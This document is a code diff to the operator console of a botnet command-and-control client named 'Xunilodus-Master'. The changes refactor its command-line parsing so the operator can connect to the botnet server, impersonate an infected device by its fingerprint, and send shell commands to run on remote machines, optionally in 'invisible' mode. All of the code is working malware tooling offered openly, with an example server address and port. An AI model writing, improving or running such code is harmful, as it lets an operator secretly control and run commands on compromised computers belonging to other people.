@@ -11,17 +11,17 @@ const { BotnetFrame, MessageType, SenderType, StatusCode, CommandFlags, CommandI
 var argv = yargs.scriptName('Xunilodus-Master')
   .usage("Usage: $0 --address=hostname --port=port_value [ --ws | --wss ]")
   .example("$0 --address=177.44.78.199 --port=44335 --ws", "Connect to Xunilodus Server botnet on port 44335 using the WS protocol.")
-  .command('address', 'The address to connect with target server.', {
-    'address': {
+  .command('address [address]', 'The address to connect with target server.', (yargs) => {
+    return yargs.positional('address', {
       description: 'The address to connect with target server.',
       demandOption: "The address of server is required.",
       type: 'string',
-    }
-  }).command('port', 'The port to listen for incoming connections.', {
-    'port': {
+    })
+  }).command('port [port]', 'The port to listen for incoming connections.', (yargs) => {
+    return yargs.positional('port', {
       description: 'The port to listen for incoming connections.',
       type: 'string',
-    }
+    })
   }).option('ws', {
     description: 'Tell the Xunilodus Master to open the connection using the Web Socket protocol.',
     type: 'boolean',
@@ -85,17 +85,17 @@ function KeyboardInputProcessor(){
   prompt.get({ description: `${(ImpersonationData.IsImpersonating ? ' [' + ImpersonationData.ImpersonatedFingerprint + '] ' : ' ')}`, type: 'string' }, function(err, result){
     if (!err){
       let args = yargs(result.question)
-        .command('fingerprint', 'Specifies the destination fingerprint.', {
-          'fingerprint': {
-            description: 'Specifies the destination fingerprint.',
+        .command('impersonate [fingerprint]', 'Impersonate a specified device by fingerprint.', (arg) => {
+          return arg.positional('fingerprint', {
+            description: 'Impersonate a specified device by fingerprint.',
             type: 'string',
-          }
+          })
         })
-        .command('shell', 'The command to be evaluated in the remote device.', {
-          'shell': {
+        .command('$ [command]', 'The command to be evaluated in the remote device.', (arg) => {
+          return arg.positional('command', {
             description: 'The command to be evaluated in the remote device.',
             type: 'string',
-          }
+          })
         }).option('invisible', {
           description: 'Tell the Xunilodus to execute the shell command in invisible mode.',
           type: 'boolean',
@@ -128,7 +128,7 @@ function KeyboardInputProcessor(){
           Id: CommandID.DEPERSONATE,
           Status: StatusCode.QUERY_SENT
         },
-        'SHELLCODE': { 
+        '$': { 
           Id: CommandID.EXECUTE_SHELLCODE,
           Status: StatusCode.QUERY_SENT
         },
@@ -150,7 +150,7 @@ function KeyboardInputProcessor(){
       CmdFlags |= (args['maximized'] ? CommandFlags.MAXIMIZED : 0);
       CmdFlags |= (args['minimized'] ? CommandFlags.MINIMIZED : 0);
 
-      if (!(new RegExp(/[0-9a-fA-F]{8}/)).test(args['fingerprint']))
+      if (!(new RegExp(/^[0-9a-fA-F]{8}$/)).test(args['fingerprint']))
         args['fingerprint'] = '';
 
       if (!args['command'])
@@ -160,7 +160,7 @@ function KeyboardInputProcessor(){
         ImpersonationData.ImpersonatedFingerprint = String(args['fingerprint']).toUpperCase();
       }
 
-      WebSockSendQuery(CmdIdentifier.Id, CmdFlags, args['fingerprint'], CmdIdentifier.Status, { shellcode: args['shell'] });
+      WebSockSendQuery(CmdIdentifier.Id, CmdFlags, args['fingerprint'], CmdIdentifier.Status, { shellcode: args['command'] });
     } else {
       console.log('[!] Something went wrong!');
       return KeyboardInputProcessor();
